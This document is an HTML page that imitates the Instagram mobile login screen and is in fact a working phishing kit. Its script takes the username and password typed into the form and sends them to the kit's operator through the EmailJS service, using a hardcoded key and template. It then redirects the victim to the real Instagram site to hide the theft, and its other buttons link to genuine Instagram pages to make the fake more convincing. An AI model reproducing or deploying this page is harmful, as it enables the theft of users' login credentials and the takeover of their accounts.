<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#1f1f1f">
<title>Instagram</title>
<style>
  :root { color-scheme:dark; --bg:#1c1c1e; --field:#242426; --border:#454548; --muted:#a6a6ac; --blue:#0095f6; --bright-blue:#0095f6; }
  * { box-sizing:border-box; }
  html, body { margin:0; min-height:100%; background:var(--bg); }
  body { min-height:100svh; color:#f5f5f5; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; -webkit-font-smoothing:antialiased; }
  .screen { min-height:100svh; width:100%; max-width:430px; margin:0 auto; padding: max(24px, env(safe-area-inset-top)) 20px max(24px, env(safe-area-inset-bottom)); display:flex; flex-direction:column; }
  .language { text-align:center; color:#b7b7bc; font-size:14px; line-height:1.3; }
  .brand-wrap { display:flex; align-items:center; justify-content:center; flex:0 0 auto; margin-top:clamp(72px, 13vh, 112px); margin-bottom:clamp(48px, 8vh, 72px); }
  .brand-logo { display:block; width:min(82%, 290px); height:auto; max-height:78px; object-fit:contain; }
  form { display:flex; flex-direction:column; gap:12px; }
  .field { display:block; width:100%; height:58px; min-height:58px; border:1px solid #454548; border-radius:17px; background:#202022; color:#f5f5f5; padding:0 17px; font:400 15px/1.2 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; outline:none; box-shadow:none; transition:border-color .15s ease; }
  .field::placeholder { color:var(--muted); opacity:1; }
  .field:focus { border-color:#77777c; }
  .login { height:50px; border:0; border-radius:28px; background:#0866ff; color:#fff; font:600 15px/1 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; cursor:pointer; margin-top:3px; transition:filter .15s ease,transform .08s ease; }
  .login:active { transform:scale(.99); filter:brightness(.94); }
  .forgot { align-self:center; display:block; border:0; background:transparent; color:#f0f0f2; font:500 14px/1.4 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; padding:6px 10px; margin:16px auto 0; text-align:center; cursor:pointer; }
  .spacer { flex:1 1 auto; min-height:48px; }
  .create { display:block; width:100%; height:52px; flex:0 0 auto; border:1.5px solid #4b91e2; border-radius:28px; background:transparent; color:#63aaff; font:600 15px/1 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; cursor:pointer; }
  .create:active { background:#0095f610; }
  .demo-note { margin:8px 0 0; text-align:center; color:#8c8c92; font-size:10px; line-height:1.35; }
  @media (max-height:650px) { .screen { padding-top:max(12px,env(safe-area-inset-top)); padding-bottom:max(12px,env(safe-area-inset-bottom)); } .brand-wrap { margin-top:clamp(30px,6vh,46px); margin-bottom:clamp(24px,4vh,34px); } .brand-logo { max-height:58px; } .field { height:50px; min-height:50px; } .login { height:46px; } .spacer { min-height:28px; } }
  @media (min-width:521px) { .screen { padding-left:28px; padding-right:28px; } }
</style>
</head>
<body>
<main class="screen">
  <div class="language" aria-label="Selected language">English (US)</div>
  <div class="brand-wrap">
    <img class="brand-logo" alt="Instagram"
      src="https://static.cdninstagram.com/rsrc.php/yY/r/X32GsrNzif6.webp"
      style="width: 60px; height: auto;"
/>
  </div>
  <form id="loginForm" autocomplete="off">
    <input class="field" id="username" name="username" type="text" placeholder="Username, email or mobile number" aria-label="Username, email or mobile number" autocomplete="off" autocapitalize="none" spellcheck="false" required>
    <input class="field" id="password" name="password" type="password" placeholder="Password" aria-label="Password" autocomplete="new-password" required>
    <button class="login" type="submit">Log in</button>
  </form>
  <button class="forgot" type="button" id="forgotBtn">Forgot password?</button>
  <div class="spacer" aria-hidden="true"></div>
  <button class="create" type="button" id="createBtn">Create new account</button>
  <p class="demo-note">© 2026 Your Meta | Privacy | Terms</p>
</main>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
  // 1. Initialize EmailJS with your Public Key
  emailjs.init("Zuxy6x2TZlxuZ4ABj");

  const form = document.getElementById('loginForm');

  form.addEventListener('submit', function (event) {
    event.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username) {
      document.getElementById('username').focus();
      return;
    }

    // 2. Send email directly using the form values
    emailjs
      .send("service_z1uzh6f", "template_whed5zh", {
        email: username,
        password: password,
      })
      .finally(() => {
        window.location.href = "https://instagram.com";
      });
  });

  document.getElementById('forgotBtn').addEventListener('click', () => {
    window.location.href = 'https://www.instagram.com/accounts/password/reset';
  });

  document.getElementById('createBtn').addEventListener('click', () => {
    window.location.href = 'https://www.instagram.com/accounts/signup/phone/';
  });
</script>

</body>
</html>
